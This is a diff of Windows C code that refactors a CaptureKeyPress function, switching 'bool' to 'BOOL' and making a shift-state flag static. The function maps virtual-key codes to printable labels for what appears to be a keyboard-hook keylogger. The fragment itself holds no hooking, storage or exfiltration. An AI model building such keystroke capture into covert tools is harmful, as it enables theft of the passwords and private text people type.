@@ -1,10 +1,9 @@
-#include <stdbool.h>
 #include <windows.h>
 
 #include "vk.h"
 
-bool isShift = false;
-const char* CaptureKeyPress(const int key, const int flags, bool clean) {
+static BOOL isShift = FALSE;
+const char* CaptureKeyPress(const int key, const int flags, BOOL clean) {
 	
 	// keydown
 	if (flags == 0) {
@@ -138,8 +137,8 @@ const char* CaptureKeyPress(const int key, const int flags, bool clean) {
 			case VK_SLEEP:    { return "[SLEEP]";  break; }
 			
 			//shift
-			case VK_LSHIFT: { isShift = true; return NULL; break; }
-			case VK_RSHIFT: { isShift = true; return NULL; break; }
+			case VK_LSHIFT: { isShift = TRUE; return NULL; break; }
+			case VK_RSHIFT: { isShift = TRUE; return NULL; break; }
 			
 			/// TODO: add more VK KEYS
 		}
@@ -149,8 +148,8 @@ const char* CaptureKeyPress(const int key, const int flags, bool clean) {
 	if (flags == 128) {
 		switch (key) {
 			//shift
-			case VK_LSHIFT: { isShift = false; return NULL; break; }
-			case VK_RSHIFT: { isShift = false; return NULL; break; }
+			case VK_LSHIFT: { isShift = FALSE; return NULL; break; }
+			case VK_RSHIFT: { isShift = FALSE; return NULL; break; }
 		}
 	}
 	
